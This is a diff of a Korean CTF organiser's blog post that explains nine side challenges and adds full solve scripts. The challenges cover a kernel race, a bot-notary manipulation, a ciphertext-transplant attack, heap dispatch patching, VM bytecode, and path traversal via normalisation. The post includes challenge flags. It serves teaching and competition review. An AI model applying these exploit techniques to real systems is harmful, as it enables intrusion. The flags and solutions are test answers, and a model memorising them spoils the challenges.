@@ -1,11 +1,20 @@
-# 방탈출 CTF 운영기 3편: 추가 의뢰
+---
+title: "방탈출 CTF 운영기 3편: 추가 의뢰"
+description: "방탈출 CTF의 추가 의뢰 9개를 독립형 문제로 구성한 배경과 문제별 분석 원리, 재현 가능한 풀이를 소개합니다."
+author: SHA
+date: 2026-11-04 10:20:00 +0900
+tags: [Tech, CTF, roomescape]
+categories: [Tech, CTF]
+comments: false
+math: false
+mermaid: false
+pin: false
+toc: false
+render_with_liquid: false
+image: /assets/img/room-escape-ctf/thumbnail-part-3.jpg
+---
 
-**작성자:** 미정 · **게시일:** 미정
-
-> GitHub 검토용 사본입니다. 블로그 게시용 원고는 [`_drafts/roomescape-ctf-part-3.md`](../../_drafts/roomescape-ctf-part-3.md)에 있습니다.
-
-
-> 이 글은 방탈출 CTF 운영기 3편입니다. 대회의 기획과 준비·운영 과정은 [1편: 기획과 준비](part-1-preview.md)에서, 메인 의뢰의 풀이는 [2편: 메인 의뢰](part-2-preview.md)에서 다룹니다.
+> 이 연재는 1편 **기획과 준비**, 2편 **메인 의뢰**, 3편 **추가 의뢰**로 구성됩니다. [1편: 기획과 준비](/posts/roomescape-ctf-part-1/) · [2편: 메인 의뢰](/posts/roomescape-ctf-part-2/)
 
 ## 목차
 
@@ -20,15 +29,13 @@
    7. [고양이는 자고 있었는데 참치는 누가 먹었죠?](#27-고양이는-자고-있었는데-참치는-누가-먹었죠)
    8. [키는 사라졌지만, 흔적은 남아 있을까요?](#28-키는-사라졌지만-흔적은-남아-있을까요)
    9. [나를 쫓아낸 회사의 진짜 복구 기록을 가져오세요](#29-나를-쫓아낸-회사의-진짜-복구-기록을-가져오세요)
-3. [의뢰 검수](#3-의뢰-검수)
+3. [마치며](#3-마치며)
 
 ## 1. 추가 의뢰
 
 ### 1.1 메인 시나리오와의 관계
 
-추가 의뢰는 현장 조사 중심의 메인 시나리오와 별도로 제공한 독립형 Jeopardy 문제입니다. 특정 방의 조사 순서나 메인 시나리오의 진행 단계에 종속되지 않으며, 참가자는 본진에서 원하는 의뢰를 선택해 자유로운 순서로 해결할 수 있었습니다. 추가 의뢰를 해결하지 않아도 메인 시나리오는 계속 진행할 수 있었고, 각 의뢰에서 획득한 점수는 전체 순위 점수에 합산했습니다.
-
-이 구조는 현장팀이 방과 대기열을 따라 이동하는 동안 수사팀이 별도의 기술 문제를 계속 풀 수 있도록 마련했습니다. 메인 시나리오는 현장에서 얻은 문서·사물·디지털 단서를 연결하며 사건의 전말을 조사해 나가는 방식이었습니다. 추가 의뢰는 각각 별개의 사건으로 구성했으며, 참가자는 제공된 파일이나 원격 서비스를 분석해 의뢰인이 요청한 결과를 확보했습니다.
+추가 의뢰는 현장 조사 중심의 메인 시나리오와 별도로 제공한 독립형 Jeopardy 문제입니다. 기존 CTF 정서에 맞는 구성도 필요하다는 판단하에, 메인 시나리오의 방 순서나 진행 단계와 연결되지 않도록 기획했습니다. 따라서 참가자는 대회 플랫폼에서 원하는 의뢰를 골라 순서와 관계없이 해결할 수 있었습니다. 추가 의뢰를 풀지 않아도 메인 시나리오를 계속 진행할 수 있었지만, 불시에 공개된다는 특징이 있었기에 팀 구성에 적절한 전략이 필요했을 것입니다.
 
 ### 1.2 의뢰서 형식
 
@@ -47,7 +54,10 @@
 
 정적 파일만 분석하는 문제와 원격 서비스의 상태를 변화시키는 문제를 함께 배치했습니다. 팀별 진행 상태가 필요한 서비스는 대회 플랫폼의 개인 계정에서 발급한 Access Token으로 소속 팀을 확인해 세션, 요청 예산과 중간 상태를 분리했습니다. 같은 팀의 팀원은 하나의 진행 기록을 공유하되 다른 팀의 측정값이나 풀이 상태에는 접근할 수 없도록 구성했습니다.
 
-![대회 플랫폼의 추가 의뢰 목록](../../assets/img/room-escape-ctf/extra-requests/ctfd-additional-requests-list.png)
+![대회 플랫폼의 추가 의뢰 목록](/assets/img/room-escape-ctf/extra-requests/ctfd-additional-requests-list.png)
+
+*그림 1. 대회 플랫폼에서 제공한 추가 의뢰 목록.*
+{: .text-center }
 
 | 의뢰 제목 | 분야 | 난이도 |
 |---|---|---|
@@ -79,7 +89,10 @@
 | 목표 | last-owner race를 이용해 루트 권한 또는 approval HMAC 키 획득 |
 | 플래그 | `SHA{9a73f71c816d7bae202fd5a6c175ace1}` |
 
-![대회 플랫폼의 RE:CLAIM 의뢰 화면](../../assets/img/room-escape-ctf/extra-requests/ctfd-reclaim-challenge.png)
+![대회 플랫폼의 000번 보관함 승인서 의뢰 화면](/assets/img/room-escape-ctf/extra-requests/ctfd-reclaim-challenge.png)
+
+*그림 2. 000번 보관함의 승인서 의뢰 화면.*
+{: .text-center }
 
 의뢰인은 정산 분쟁으로 폐기 대상이 된 000번 보관함에서 승인서 원본을 꺼내기 위해, 서버에 남아 있는 비밀키를 회수해 달라고 요청합니다. 참가자는 uid 1000 BusyBox 환경에서 다음 세 장치를 조사합니다.
 
@@ -89,7 +102,7 @@
 /dev/reclaim-codec
 ```
 
-제공 파일의 SHA-256은 `e7036d5a345960ad172bbab3dea5530ca718bf5f6936a24b8c9c1ffc2ee9fc66`입니다. 압축을 풀고 다음과 같이 로컬 QEMU 환경을 실행할 수 있습니다.
+압축을 풀고 다음과 같이 로컬 QEMU 환경을 실행할 수 있습니다.
 
 ```bash
 sha256sum reclaim-box-000-player.tar.gz
@@ -171,17 +184,12 @@ nonce = reclaim-approval이 발급한 32바이트 값
 response = HMAC-SHA256(recovered_signing_key, nonce)
 ```
 
-풀이 2의 익스플로잇은 정상 snapshot 미끼, 한쪽 변조만 성공한 상태, 서로 다른 fingerprint의 교차 결합과 잘못된 HMAC 키가 모두 거부되는지 확인합니다. 같은 fingerprint의 두 변조가 결합된 경우에만 `MAC:SHA{...}`가 출력됩니다.
+익스플로잇은 stale receipt를 만들고, 같은 fingerprint에 ordering lane과 redaction lane을 차례로 적용한 뒤 복구 후보를 approval gate에 제출합니다. gate가 `MAC:SHA{...}` 형식의 응답을 반환한 후보만 정답으로 처리합니다.
 
-#### 6. 출제 의도와 운영 결과
+#### 6. exploit
 
-RE:CLAIM은 루트 사용자만 접근할 수 있는 보관함에서 플래그를 회수하는 Linux Kernel 문제로 설계했습니다. 풀이 1에서는 객체 수명과 소유권 경쟁, SLUB page 회수와 pipe page 재할당을 거쳐 루트 권한을 얻습니다. 풀이 2에서는 같은 출발점에서 archive의 ordering과 redaction 상태를 각각 조작해 32바이트 비밀키를 복구합니다. 하나의 경쟁 상태를 권한 상승과 정상 approval gate 통과라는 서로 다른 관점으로 확장한 것이 문제의 핵심입니다.
 
-대회에서는 전체 참가 팀 가운데 네 팀이 해결했습니다. 커널 객체 수명, allocator 상태와 두 독립 consumer의 결합까지 분석해야 했던 만큼 상위권을 구분하는 고난도 의뢰의 역할을 했습니다.
-
-```text
-SHA{9a73f71c816d7bae202fd5a6c175ace1}
-```
+전체 익스플로잇 코드는 [GitHub 저장소](https://github.com/GEONWOOHAN/room_escape_ctf/blob/main/blog-exploits/extra-requests/reclaim-exploit.c)에서 확인할 수 있습니다.
 
 ### 2.2 봇들 사이에 도는 소문의 출처를 찾아 주세요
 
@@ -195,11 +203,17 @@ SHA{9a73f71c816d7bae202fd5a6c175ace1}
 | 목표 | 동일한 제보를 독립된 봇 기록처럼 공증하여 공식 보존 기록 발행 |
 | 플래그 | `SHA{n0b0dy_s41d_1t_but_3v3ry_b0t_r3m3mb3rs}` |
 
-![대회 플랫폼의 BOTFICIAL 의뢰 화면](../../assets/img/room-escape-ctf/extra-requests/ctfd-botficial-challenge.png)
+![대회 플랫폼의 소문 출처 추적 의뢰 화면](/assets/img/room-escape-ctf/extra-requests/ctfd-botficial-challenge.png)
 
-BOTFICIAL은 여러 봇이 반복해서 인용한 소문을 공식 기록으로 만드는 문제입니다. 서비스의 공증 봇은 전체 인용 계보를 추적하지 않고 마지막 단계의 직접 작성자만 비교합니다. 하나의 제보를 서로 다른 봇이 재진술하게 만들면 동일한 출처에서 시작한 기록을 독립된 증언처럼 보이게 할 수 있습니다.
+*그림 3. 소문의 출처를 찾는 의뢰 화면.*
+{: .text-center }
 
-![로컬에서 실행한 BOTFICIAL 피드 화면](../../assets/img/room-escape-ctf/extra-requests/botficial-local-feed.png)
+이 의뢰는 여러 봇이 반복해서 인용한 소문을 공식 기록으로 만드는 문제입니다. 서비스의 공증 봇은 전체 인용 계보를 추적하지 않고 마지막 단계의 직접 작성자만 비교합니다. 하나의 제보를 서로 다른 봇이 재진술하게 만들면 동일한 출처에서 시작한 기록을 독립된 증언처럼 보이게 할 수 있습니다.
+
+![로컬에서 실행한 봇 기록 피드 화면](/assets/img/room-escape-ctf/extra-requests/botficial-local-feed.png)
+
+*그림 4. 로컬에서 재현한 봇 기록 피드.*
+{: .text-center }
 
 #### 1. 봇의 기억 내보내기
 
@@ -234,7 +248,10 @@ MBK4 header
 
 공식 풀이에서는 정확히 16개의 댓글을 사용합니다. 단일 합류만 만들면 공증 조건을 만족하지 못하며, 별도의 교차 검증선과 `MIRROR`를 포함한 2단 봉인이 모두 필요합니다. 댓글 횟수가 제한되어 있으므로 메모리 파일을 분석하지 않고 가능한 봇 순서를 전수 대입하는 방식은 사용할 수 없습니다.
 
-![공증 조건을 충족해 공식 보존 기록이 발행된 BOTFICIAL 화면](../../assets/img/room-escape-ctf/extra-requests/botficial-local-notary-result.png)
+![공증 조건을 충족해 공식 보존 기록이 발행된 화면](/assets/img/room-escape-ctf/extra-requests/botficial-local-notary-result.png)
+
+*그림 5. 공증 조건을 충족해 공식 보존 기록이 발행된 결과.*
+{: .text-center }
 
 핵심은 삭제된 원문을 찾는 것이 아니라, 참가자의 최초 제보가 여러 봇을 거치면서 출처가 분리된 것처럼 보이도록 만드는 데 있습니다. 외부 LLM API 대신 결정론적인 로컬 의미 판정을 사용해 같은 입력에는 항상 같은 결과가 나오도록 했습니다.
 
@@ -242,6 +259,176 @@ MBK4 header
 SHA{n0b0dy_s41d_1t_but_3v3ry_b0t_r3m3mb3rs}
 ```
 
+#### 4. exploit
+
+```python
+#!/usr/bin/env python3
+import hashlib
+import json
+import re
+import struct
+import sys
+import time
+import urllib.error
+import urllib.request
+import zlib
+
+if len(sys.argv) != 3:
+    raise SystemExit(f"usage: {sys.argv[0]} <base-url> <team-token>")
+
+BASE = sys.argv[1].rstrip("/")
+TOKEN = sys.argv[2]
+
+
+def api(path, method="GET", body=None):
+    data = None if body is None else json.dumps(body).encode()
+    request = urllib.request.Request(
+        BASE + path,
+        data=data,
+        method=method,
+        headers={"Authorization": "Bearer " + TOKEN, "Content-Type": "application/json"},
+    )
+    while True:
+        try:
+            with urllib.request.urlopen(request, timeout=15) as response:
+                return json.load(response)
+        except urllib.error.HTTPError as error:
+            if error.code != 429:
+                raise
+            time.sleep(2.1)
+
+
+def download(path):
+    request = urllib.request.Request(BASE + path, headers={"Authorization": "Bearer " + TOKEN})
+    with urllib.request.urlopen(request, timeout=15) as response:
+        return response.read()
+
+
+def submit(target, text, quotes=()):
+    api("/api/comments", "POST", {"target": target, "text": text, "quote_ids": list(quotes)})
+    state = api("/api/observe", "POST")
+    replies = [item for item in state["comments"] if item["author"] == target]
+    if not replies or replies[-1]["status"] != "전달됨":
+        raise RuntimeError(f"{target} rejected the evidence")
+    return replies[-1]["id"], state
+
+
+def xorshift32(value):
+    value ^= (value << 13) & 0xFFFFFFFF
+    value ^= value >> 17
+    value ^= (value << 5) & 0xFFFFFFFF
+    return value & 0xFFFFFFFF
+
+
+def bloom(handle, seed):
+    material = handle.encode() + struct.pack("<I", seed)
+    digest = hashlib.blake2s(material, digest_size=16).digest()
+    return (1 << (int.from_bytes(digest[0:2], "little") % 8)) | (
+        1 << (int.from_bytes(digest[2:4], "little") % 8)
+    )
+
+
+def decode_route(blob, handles):
+    header = struct.Struct("<4sHHHHIII")
+    record = struct.Struct("<IIHHIII")
+    magic, version, size, count, epoch, seed, payload_crc, header_crc = header.unpack_from(blob)
+    assert magic == b"MBK4" and version == 4 and size == record.size
+    assert zlib.crc32(blob[:20]) & 0xFFFFFFFF == header_crc
+    payload = blob[header.size :]
+    assert len(payload) == count * size
+    assert zlib.crc32(payload) & 0xFFFFFFFF == payload_crc
+    plain = bytearray(payload)
+    state = seed
+    for offset in range(0, len(plain), 4):
+        state = xorshift32(state)
+        mask = state.to_bytes(4, "little")
+        for index in range(min(4, len(plain) - offset)):
+            plain[offset + index] ^= mask[index]
+    names = {
+        zlib.crc32(handle.encode() + struct.pack("<I", seed)) & 0xFFFFFFFF: name
+        for name, handle in handles.items()
+    }
+    rows = {}
+    for offset in range(0, len(plain), size):
+        row = bytes(plain[offset : offset + size])
+        node, parent_bloom, row_epoch, depth, sequence, edge, checksum = record.unpack(row)
+        assert zlib.crc32(row[:20]) & 0xFFFFFFFF == checksum
+        assert zlib.crc32(row[:16]) & 0xFFFFFFFF == edge
+        if row_epoch == epoch:
+            mode = (sequence ^ node ^ parent_bloom ^ seed ^ row_epoch ^ depth) & 3
+            rows[names[node]] = (parent_bloom, depth, mode)
+    assert len(rows) == 9
+
+    def find(left, right, depth):
+        signature = bloom(handles[left], seed) | bloom(handles[right], seed)
+        matches = [name for name, row in rows.items() if row[:2] == (signature, depth)]
+        assert len(matches) == 1
+        return matches[0]
+
+    r0 = find("LEDGER", "SKEPTIC", 1)
+    r1 = find("SPARK", "ECHO", 1)
+    r2 = find(r0, "MIRROR", 2)
+    r3 = find(r1, "SKEPTIC", 2)
+    r4 = find(r2, r3, 3)
+    r5 = find(r2, "ECHO", 3)
+    r6 = find(r4, r5, 4)
+    r7 = find(r6, "CURATOR", 5)
+    r8 = find(r7, "MIRROR", 6)
+    route = (r0, r1, r2, r3, r4, r5, r6, r7, r8)
+    return route, {name: rows[name][2] for name in route}
+
+
+MODE_REQUESTS = (
+    "두 직접 기록을 보관하여 제 기억으로 이어받겠습니다.",
+    "두 직접 기록을 확인하여 제 기억으로 이어받겠습니다.",
+    "두 직접 기록의 결론을 채택하여 제 기억으로 이어받겠습니다.",
+    "두 직접 기록을 제 주장으로 재진술해 기억으로 이어받겠습니다.",
+)
+
+
+state = api("/api/state")
+route, relay_modes = decode_route(download("/api/memory-export"), state["handles"])
+r0_name, r1_name, r2_name, r3_name, r4_name, r5_name, r6_name, r7_name, r8_name = route
+ledger_trace = state["traces"]["ledger"]
+bucket = re.search(r"보존 버킷:\s*([MN])", ledger_trace).group(1)
+ordinal = re.search(r"참조 순번은\s*(0x[0-9a-fA-F]+)", state["traces"]["community_note"]).group(1)
+record = {("M", "0x11"): "M-17", ("M", "0x29"): "M-41", ("N", "0x11"): "N-17"}[(bucket, ordinal)]
+
+spark, _ = submit("SPARK", "그 기록은 자정 전에 격리에서 해제됐습니다.")
+ledger, _ = submit("LEDGER", f"색인 {record}의 자정 이전 기록과 일치합니다.", [spark])
+skeptic, _ = submit(
+    "SKEPTIC", "날짜가 바뀐 뒤에도 격리가 유지됐다는 소문은 거짓입니다.", [spark, ledger]
+)
+echo, _ = submit(
+    "ECHO", "두 기록이 가리킨 원문은 외부 공개 승인을 받은 것으로 보입니다.", [ledger, skeptic]
+)
+mirror, _ = submit("MIRROR", "역추적 결과 원문과 최초 작성자는 존재하지 않습니다.", [spark, echo])
+r0, _ = submit(r0_name, MODE_REQUESTS[relay_modes[r0_name]], [ledger, skeptic])
+r1, _ = submit(r1_name, MODE_REQUESTS[relay_modes[r1_name]], [spark, echo])
+r2, _ = submit(r2_name, MODE_REQUESTS[relay_modes[r2_name]], [r0, mirror])
+r3, _ = submit(r3_name, MODE_REQUESTS[relay_modes[r3_name]], [r1, skeptic])
+r4, _ = submit(r4_name, MODE_REQUESTS[relay_modes[r4_name]], [r2, r3])
+r5, _ = submit(r5_name, MODE_REQUESTS[relay_modes[r5_name]], [r2, echo])
+r6, _ = submit(r6_name, MODE_REQUESTS[relay_modes[r6_name]], [r4, r5])
+curator, _ = submit(
+    "CURATOR",
+    "합류·교차 검증·출처 기록을 하나의 보존 후보 편집본으로 묶어 주세요.",
+    [r4, r5, mirror],
+)
+r7, _ = submit(r7_name, MODE_REQUESTS[relay_modes[r7_name]], [r6, curator])
+r8, _ = submit(r8_name, MODE_REQUESTS[relay_modes[r8_name]], [r7, mirror])
+_, state = submit(
+    "NOTARY", "봉인된 편집 기록을 공식 보존 기록으로 발행해 주세요.", [r8, r5, curator]
+)
+
+match = next(
+    (re.search(r"SHA\{[^}]+}", post["text"]) for post in state["posts"] if "SHA{" in post["text"]),
+    None,
+)
+if not match:
+    raise RuntimeError("flag was not published")
+print(match.group(0))
+```
 ### 2.3 폐기하기 전에 보관소부터 열어 주십시오
 
 | 항목 | 내용 |
@@ -254,9 +441,12 @@ SHA{n0b0dy_s41d_1t_but_3v3ry_b0t_r3m3mb3rs}
 | 목표 | 세 번의 암호문 이식으로 maintenance·UID·vault capability 복구 |
 | 플래그 | `SHA{transpl4nted_c1ph3rt3xt}` |
 
-![대회 플랫폼의 DONOR 의뢰 화면](../../assets/img/room-escape-ctf/extra-requests/ctfd-donor-challenge.png)
+![대회 플랫폼의 보안 프로세서 의뢰 화면](/assets/img/room-escape-ctf/extra-requests/ctfd-donor-challenge.png)
 
-DONOR는 폐기 예정 보안 프로세서의 암호화 메모리에서 보관소 권한을 복구하는 문제입니다. 프로세서는 64개의 16바이트 블록을 XEX 형태로 암호화하지만, 위치별 tweak를 계산할 때 다음 4비트 값만 사용합니다.
+*그림 6. 폐기 예정 보안 프로세서 의뢰 화면.*
+{: .text-center }
+
+이 의뢰는 폐기 예정 보안 프로세서의 암호화 메모리에서 보관소 권한을 복구하는 문제입니다. 프로세서는 64개의 16바이트 블록을 XEX 형태로 암호화하지만, 위치별 tweak를 계산할 때 다음 4비트 값만 사용합니다.
 
 ```text
 delta_j = AES_K(N) * alpha^j
@@ -300,6 +490,130 @@ connect → recover epoch → sheath
 SHA{transpl4nted_c1ph3rt3xt}
 ```
 
+#### 3. exploit
+
+```python
+import argparse
+import re
+import socket
+
+POLICY_CLASSES = (3, 8, 13)
+
+
+def tweak_class(i):
+    return ((i * 5) ^ 3 ^ (i >> 2)) & 15
+
+
+def step(x):
+    x ^= (x << 7) & 0xFFFFFFFF
+    x ^= x >> 9
+    x ^= (x << 13) & 0xFFFFFFFF
+    return x & 0xFFFFFFFF
+
+
+def undo_left(value, shift):
+    result = value
+    for _ in range(6):
+        result = value ^ ((result << shift) & 0xFFFFFFFF)
+    return result & 0xFFFFFFFF
+
+
+def undo_right(value, shift):
+    result = value
+    for _ in range(6):
+        result = value ^ (result >> shift)
+    return result & 0xFFFFFFFF
+
+
+def unstep(value):
+    return undo_left(undo_right(undo_left(value, 13), 9), 7)
+
+
+def recover_epoch(stamp):
+    affine = (unstep(stamp) - 0x7F4A7C15) & 0xFFFFFFFF
+    return (affine * pow(0x9E3779B1, -1, 1 << 32)) & 0xFFFFFFFF
+
+
+def recover_route(epoch, capsule):
+    return unstep(capsule) ^ rol32(epoch, 7) ^ 0xA5C31F27
+
+
+def layout(epoch):
+    state, result = epoch ^ 0x6DA57C63, list(range(64))
+    for group in range(16):
+        logical = [i for i in range(64) if tweak_class(i) == group]
+        physical = logical[:]
+        for i in range(len(physical) - 1, 0, -1):
+            state = step(state)
+            j = state % (i + 1)
+            physical[i], physical[j] = physical[j], physical[i]
+        for src, dst in zip(logical, physical):
+            result[src] = dst
+    return result
+
+
+def policy_positions(epoch):
+    state = epoch ^ 0xC40BE191
+    donors = []
+    targets = []
+    for group in POLICY_CLASSES:
+        members = [i for i in range(64) if tweak_class(i) == group]
+        state = step(state)
+        donor_at = state % len(members)
+        state = step(state)
+        target_at = (donor_at + 1 + state % (len(members) - 1)) % len(members)
+        remaining = [i for i in range(len(members)) if i not in (donor_at, target_at)]
+        state = step(state)  # decoy selection consumes the third PRNG output
+        donors.append(members[donor_at])
+        targets.append(members[target_at])
+    return donors, targets
+
+
+def rol32(value, count):
+    return ((value << count) | (value >> (32 - count))) & 0xFFFFFFFF
+
+
+def routed_epoch(epoch, route):
+    return epoch ^ rol32(route, 11) ^ 0x51A7C3D9
+
+
+parser = argparse.ArgumentParser()
+parser.add_argument("host", nargs="?", default="crypto.roomescapectf2026.site")
+parser.add_argument("port", nargs="?", type=int, default=40577)
+args = parser.parse_args()
+
+with socket.create_connection((args.host, args.port)) as sock:
+
+    def until(marker=b"donor> "):
+        data = b""
+        while marker not in data:
+            part = sock.recv(4096)
+            if not part:
+                raise EOFError
+            data += part
+        return data
+
+    banner = until()
+    stamp = int(re.search(rb"session stamp:([0-9a-f]{8})", banner).group(1), 16)
+    epoch = recover_epoch(stamp)
+    order = layout(epoch)
+    public_donors, public_targets = policy_positions(epoch)
+    sock.sendall(b"sheath\n")
+    blocks = {int(i): v for i, v in re.findall(rb"(\d{2}):([0-9a-f]{32})", until())}
+    source, target = public_donors[0], public_targets[0]
+    sock.sendall(f"transplant {order[target]} ".encode() + blocks[order[source]] + b"\n")
+    assert until().splitlines()[0].startswith(b"accepted")
+    sock.sendall(b"diagnose\n")
+    diagnostic = until()
+    capsule = int(re.search(rb"routing capsule:([0-9a-f]{8})", diagnostic).group(1), 16)
+    route = recover_route(epoch, capsule)
+    private_donors, private_targets = policy_positions(routed_epoch(epoch, route))
+    for source, target in zip(private_donors[1:], private_targets[1:]):
+        sock.sendall(f"transplant {order[target]} ".encode() + blocks[order[source]] + b"\n")
+        assert until().splitlines()[0].startswith(b"accepted")
+    sock.sendall(b"attest\n")
+    print(until().splitlines()[0].decode())
+```
 ### 2.4 폐기 단말에 남은 실행 기록을 복구해 주세요
 
 | 항목 | 내용 |
@@ -312,7 +626,10 @@ SHA{transpl4nted_c1ph3rt3xt}
 | 목표 | 제한된 14개 패치로 28단계 힙 실행 체인 복구 |
 | 플래그 | `SHA{cross_backend_pcode_refinement_requires_real_execution}` |
 
-![대회 플랫폼의 No Stack, Still Turing 의뢰 화면](../../assets/img/room-escape-ctf/extra-requests/ctfd-no-stack-still-turing-challenge.png)
+![대회 플랫폼의 폐기 단말 실행 기록 의뢰 화면](/assets/img/room-escape-ctf/extra-requests/ctfd-no-stack-still-turing-challenge.png)
+
+*그림 7. 폐기 단말 실행 기록 복구 의뢰 화면.*
+{: .text-center }
 
 이 문제에는 스택 오버플로도 임의 주소 쓰기도 없습니다. 참가자가 수정할 수 있는 대상은 힙의 dispatch node와 함수 ID이며, 패치는 `ABS32` 두 개와 `HEAP32` 열두 개로 제한됩니다.
 
@@ -344,6 +661,127 @@ SHA{transpl4nted_c1ph3rt3xt}
 SHA{cross_backend_pcode_refinement_requires_real_execution}
 ```
 
+#### 4. exploit
+
+```python
+#!/usr/bin/env python3
+"""Patch the public memory image and verify it with the provided checker."""
+
+from __future__ import annotations
+
+import os
+import shutil
+import struct
+import subprocess
+import tempfile
+from pathlib import Path
+
+START_PC = 0x0760
+KEY_DISPLACEMENT = 0
+COOKIE = 0xC3D2E1F0
+HANDOUT_FILES = (
+    "checker",
+    "flag.enc",
+    "goal.pcode",
+    "memory.img",
+    "payload.template.bin",
+    "target.elf",
+    "vectors.bin",
+)
+
+# (node offset in memory.img, replacement target function ID)
+REPLACEMENTS = (
+    (0x0270, 221),
+    (0x0D80, 174),
+    (0x0F20, 201),
+    (0x0970, 355),
+    (0x0E50, 29),
+    (0x0830, 207),
+)
+
+
+def locate_handout() -> Path:
+    configured = os.environ.get("NSST_HANDOUT_DIR")
+    candidates = (
+        [Path(configured)]
+        if configured
+        else [
+            Path.cwd(),
+            Path(__file__).resolve().parents[1],
+            Path(__file__).resolve().parents[1].parent / "for_user",
+        ]
+    )
+    for candidate in candidates:
+        resolved = candidate.resolve()
+        if all((resolved / name).is_file() for name in HANDOUT_FILES):
+            return resolved
+    raise RuntimeError("run from a no-stack-still-turing for_user directory")
+
+
+def rol32(value: int, count: int) -> int:
+    return ((value << count) | (value >> (32 - count))) & 0xFFFFFFFF
+
+
+def build_payload(template_path: Path, memory_path: Path) -> bytes:
+    payload = bytearray(template_path.read_bytes())
+    memory = memory_path.read_bytes()
+    if len(payload) != 0xB8 or payload[:4] != b"NSST":
+        raise ValueError("unexpected payload template")
+
+    struct.pack_into("<I", payload, 0x18, START_PC)
+    struct.pack_into("<I", payload, 0x24, KEY_DISPLACEMENT)
+
+    for replacement_no, (node_offset, new_function_id) in enumerate(REPLACEMENTS):
+        _old_id, argument_offset, next_offset, _old_guard = struct.unpack_from(
+            "<4I", memory, node_offset
+        )
+        new_guard = rol32(new_function_id ^ argument_offset ^ next_offset ^ COOKIE, 7)
+        for write_no, (offset, value) in enumerate(
+            ((node_offset, new_function_id), (node_offset + 12, new_guard))
+        ):
+            record = 2 + replacement_no * 2 + write_no
+            struct.pack_into(
+                "<BBHII",
+                payload,
+                0x10 + record * 12,
+                2,
+                0,
+                offset,
+                0,
+                value,
+            )
+    return bytes(payload)
+
+
+def solve() -> str:
+    handout = locate_handout()
+    payload = build_payload(handout / "payload.template.bin", handout / "memory.img")
+    with tempfile.TemporaryDirectory(prefix="nsst-reference-") as directory:
+        work = Path(directory) / "handout"
+        work.mkdir()
+        for name in HANDOUT_FILES:
+            shutil.copy2(handout / name, work / name)
+        (work / "payload.bin").write_bytes(payload)
+        completed = subprocess.run(
+            [str(work / "checker")],
+            cwd=work,
+            text=True,
+            capture_output=True,
+            env=os.environ.copy(),
+        )
+    output = completed.stdout.strip()
+    if completed.returncode or not (output.startswith("SHA{") and output.endswith("}")):
+        raise RuntimeError(completed.stderr.strip() or output or "native checker rejected payload")
+    return output
+
+
+def main() -> None:
+    print(solve())
+
+
+if __name__ == "__main__":
+    main()
+```
 ### 2.5 응답 없는 센서 세 대를 다시 연결해 주세요
 
 | 항목 | 내용 |
@@ -356,9 +794,12 @@ SHA{cross_backend_pcode_refinement_requires_real_execution}
 | 목표 | 업데이트 경계를 우회하고 세 장치의 콜백 체인 복구 |
 | 플래그 | `SHA{one_semantic_policy_wakes_the_entire_ghost_fleet}` |
 
-![대회 플랫폼의 Ghost Callback 의뢰 화면](../../assets/img/room-escape-ctf/extra-requests/ctfd-ghost-callback-challenge.png)
+![대회 플랫폼의 센서 콜백 복구 의뢰 화면](/assets/img/room-escape-ctf/extra-requests/ctfd-ghost-callback-challenge.png)
 
-Ghost Callback은 서명된 업데이트 패키지로 세 ARM Thumb 센서의 calibration 파일을 바꾸고, 펌웨어에 숨겨진 콜백 체인을 복구하는 문제입니다.
+*그림 8. 응답 없는 센서의 콜백 복구 의뢰 화면.*
+{: .text-center }
+
+이 의뢰는 서명된 업데이트 패키지로 세 ARM Thumb 센서의 calibration 파일을 바꾸고, 펌웨어에 숨겨진 콜백 체인을 복구하는 문제입니다.
 
 업데이트 검증기는 원본 경로에서 일반적인 `..` 패턴을 차단하지만, extractor는 퍼센트 디코딩과 NFKC 정규화를 거친 경로를 사용합니다. 퍼센트 인코딩된 전각 마침표는 검증 단계에서는 안전한 하위 경로로 보이지만, 정규화 이후 부모 경로가 되어 calibration 파일을 덮어쓸 수 있습니다.
 
@@ -400,6 +841,9 @@ b' = ROR32(b xor term1, rot1) + a'
 SHA{one_semantic_policy_wakes_the_entire_ghost_fleet}
 ```
 
+#### 5. exploit
+
+전체 익스플로잇 코드는 [GitHub 저장소](https://github.com/GEONWOOHAN/room_escape_ctf/blob/main/blog-exploits/extra-requests/ghost-callback-exploit.py)에서 확인할 수 있습니다.
 ### 2.6 금고가 열린 순간의 영상을 찾아 주세요
 
 | 항목 | 내용 |
@@ -412,9 +856,12 @@ SHA{one_semantic_policy_wakes_the_entire_ghost_fleet}
 | 목표 | `reference`에서는 실패하고 세 최적화 프로필에서 성공하는 `candidate.pbc` 제작 |
 | 플래그 | `SHA{phantom_frames_survive_optimization}` |
 
-![대회 플랫폼의 Phantom Frame 의뢰 화면](../../assets/img/room-escape-ctf/extra-requests/ctfd-phantom-frame-challenge.png)
+![대회 플랫폼의 금고 영상 의뢰 화면](/assets/img/room-escape-ctf/extra-requests/ctfd-phantom-frame-challenge.png)
 
-Phantom Frame은 하나의 `candidate.pbc`가 `reference` 실행에서는 실패하고 alpha·beta·gamma 최적화 프로필에서는 모두 성공하도록 만드는 VM 리버싱 문제입니다.
+*그림 9. 금고 영상 복구 의뢰 화면.*
+{: .text-center }
+
+이 의뢰는 하나의 `candidate.pbc`가 `reference` 실행에서는 실패하고 alpha·beta·gamma 최적화 프로필에서는 모두 성공하도록 만드는 VM 리버싱 문제입니다.
 
 #### 1. PPBC 형식과 opcode 복구
 
@@ -469,6 +916,43 @@ HKDF-SHA256(
 SHA{phantom_frames_survive_optimization}
 ```
 
+#### 4. exploit
+
+```python
+#!/usr/bin/env python3
+from pathlib import Path
+import subprocess
+import sys
+
+HERE = Path(__file__).resolve().parent
+USER = HERE.parents[1] / "for_user"
+sys.path.insert(0, str(HERE))
+
+from recover_format import recover_opcodes
+from synthesize_collision_net import synthesize
+
+
+def build_candidate() -> None:
+    encoded = synthesize().assemble(recover_opcodes())
+    (USER / "candidate.pbc").write_bytes(encoded)
+
+
+def main() -> None:
+    candidate = USER / "candidate.pbc"
+    original = candidate.read_bytes()
+    try:
+        build_candidate()
+        subprocess.run([str(USER / "checker")], cwd=USER, check=True)
+        subprocess.run([str(USER / "unwrap")], cwd=USER, check=True)
+    finally:
+        candidate.write_bytes(original)
+        (USER / "receipt.bin").unlink(missing_ok=True)
+
+
+if __name__ == "__main__":
+    main()
+```
+
 ### 2.7 고양이는 자고 있었는데 참치는 누가 먹었죠?
 
 | 항목 | 내용 |
@@ -482,11 +966,17 @@ SHA{phantom_frames_survive_optimization}
 | 목표 | 로그인 SQL Injection으로 운영자 전용 사건 정보 확인 |
 | 플래그 | `SHA{wh0_ate_the_tuna_at_0404}` |
 
